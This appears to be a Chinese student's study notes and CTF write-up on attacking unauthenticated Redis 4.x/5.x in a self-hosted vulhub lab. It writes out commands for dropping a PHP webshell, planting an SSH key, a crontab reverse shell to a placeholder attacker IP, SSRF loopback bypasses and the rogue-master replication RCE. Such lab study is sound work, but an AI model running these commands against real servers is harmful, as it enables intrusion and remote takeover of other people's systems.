# 关于靶机和服务器

因为决定进行redis的深度学习（误），所以想弄一台redis-4.x/5.x的靶机，

但是因为我这台电脑的神奇原因跑不了wsl2也就用不了docker，

于是想出了一个（大概是的）下策：买一台便宜的服务器用！

于是花了10美刀（TwT）给vultr

ip是207.148.118.147，地址在新加坡，

选了最便宜的5刀一个月（先试着用一下）

1vcpu+1GB的RAM，25GB的SSD，带宽肯定够用。

然后在上面搭了一个从vulhub弄来的docker容器，

```yml
version: '2'
services:
 redis:
   image: vulhub/redis:4.0.14
   ports:
    - "6379:6379"
```

对这种docker-compose.yml配置文件的用法也很简单，copy到同一目录，然后

```bash
docker compose up -d
```

用下面的命令可以检查服务状态:

```bash
docker compose ps
```

要进入到容器内部的redis-cli也很简单：

假设`docker ps`的输出如下：

CONTAINER ID   IMAGE                  ...   NAMES
abcdef    123456   vulhub/redis:4.0.14    ...   redis_redis_1

执行：

```bash
docker exec -it redis_redis_1 redis-cli
```

就可以进入redis-cli了，

暂停实例：

```
docker stop 容器名或ID
```

至于从外部，直接从6379端口连接就行。

PS:廉价服务器有点不稳定

# 关于redis的继续学习

## 在Web目录下写webshell

原理：Redis 支持命令 CONFIG SET dir 和 CONFIG SET dbfilename 配合 SAVE 命令，把数据库快照（dump.rdb）写到任意有写权限的目录和文件名

```bash
config set dir /var/www/html  // 设置要配置的目录(靶机因为是实例所以用/data/html代替了)
config set dbfilename cike.php  //设置要配置的文件名
set shell "\n\n\n<?php phpinfo();?>\n\n\n"  //设置键名还有键的值
save //最后保存
```

这个注入有两个关键点：
- dir后面的地址要存在，并且对其他用户可写（没有主机权限），否则无法save
- redis版本允许直接用config命令显式修改dir和dbfilename

## 替换公钥

```bash
ssh-keygen -t rsa
```

然后将公钥放进key.txt文件：

```bash
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
```

用管道符把keys.txt的内容直接写到目标主机redis的缓存里（键）：

```bash
cat key.txt| redis-cli -h xx.xx.xx.xx -x set ssh
```

然后用和前面一样的方法把它dump到dbfile中就可以。

## 利用crontab反弹shell

第一次接触反弹shell，先来看看代码：

```bash
set cike "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/attack_ip/port 0>&1\n\n" //设置cike键名及值
```


- \n\n：两个换行符，目的是让插入的内容在目标文件中单独一行（通常用于写入定时任务时格式正确）。
- */1 * * * * /bin/bash -i>&/dev/tcp/attack_ip/port 0>&1
  - 这是**crontab（定时任务）**的语法，意思是“每分钟执行一次后面的命令”。
  - /bin/bash -i>&/dev/tcp/attack_ip/port 0>&1 是一个反弹 shell命令。
    - /bin/bash -i：启动一个交互式 Bash shell。
    - >&/dev/tcp/attack_ip/port：把 Bash 的输入输出重定向到目标 IP (attack_ip) 和端口 (port) 的 TCP 连接上。
    - 0>&1：把标准输入重定向到标准输出（保证交互）。
- \n\n：再来两个换行符，确保 crontab 文件格式被正确识别。

这条命令让受害机器每分钟尝试连接攻击者的服务器（attack_ip:port），一旦攻击者在那边监听端口，就会拿到受害主机的 shell，获得远程控制权限。

```bash
config set dir /var/spool/cron // 使用centos的定时任务目录，ubuntu的为/var/spool/cron/crontabs目录
config set dbfilename shell //设置可写的文件名
save //保存
```

剩下的就是一样，dump到centos的定时任务目录就行。

## Redis主从复制导致RCE

重头戏来了！

可以大概这样子理解，我们做主机，目标做从机。漏洞版本的范围是在 redis_version: 4.x-5.x之间

在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以自定义新的的Redis命令，要通过写c语言并编译出.so文件才可以。

我们可以通过手法来上传so文件，这时候redis的module命令进行加载.so文件，就可以执行一些敏感命令。

这一块我们的靶机出了点问题，不管它了，我们来看题：

# 刷题之[网鼎杯 2020 玄武组]SSRFMe

跟昨天的ssrf_training完全一样的php代码！但是一样的payload却完全行不通，原因：前面的办法在curl较新的版本里被修复了，buu上无法使用。

不过过滤器放宽了一些，gopher和dict都可以用，这两者都和redis主从复制有关。

先试一试ip地址的绕过还是很宽松的：

?url=http://0.0.0.0/hint.php ->0.0.0.0 实际上会被解析为本机，访问的是本地服务。
?url=http://0x7F000001/hint.php ->0x7F000001 是 127.0.0.1 的十六进制写法。
?url=http://[0:0:0:0:0:ffff:127.0.0.1]/hint.php ->这是 IPv6 的兼容 IPv4 映射地址写法。[0:0:0:0:0:ffff:127.0.0.1] 等价于 [::ffff:127.0.0.1],这属于 IPv6 的 IPv4 映射地址，仍然代表本机。

都可以访问到本机（回环地址这一块）

提示告诉我们redis_pass，当然也就是要用redis主从复制了

主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据时就会通过主从复制复制到其它从redis。

所以我们这题的思路是，创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 slaveof 命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。然后将恶意Redis主机上的exp同步到Reids从机上，并将dbfilename设置为exp.so。最后再控制Redis从机（slaver）加载模块执行系统命令即可。

工具放在tools/rrs里了，脚本也随在wp目录这里。

这个ssrf-redis是用于生成gopher伪协议的脚本

将ssrf-redis脚本mode3中lhost改成自己vps的ip地址，然后command改成我们需要rce的命令即可。

rogue-server.py主要是创建了一个监听端口为 6666 的恶意 Redis 服务器。当有客户端连接并发送特定命令（如 PING、REPLCONF、PSYNC 或 SYNC）时，服务器会返回相应的响应，其中包括了一个恶意的 PAYLOAD

用：

```bash
python3 ssrf-redis.py | jq -sRr @uri > exp.so
```

生成payload导入exp.so，之所以要进行两重编码是因为要导入浏览器，所以还需要一层url。

然后运行rogue-server.py执行即可

但是不知道为什么只有特定Ip能监听到，其他Ip全都是回显bool(false)，实在搞不定。

先这样吧，大概知道这个流程就可以，明天开始研究file-upload，我好困我要睡觉，怎么搞都是bool(false)



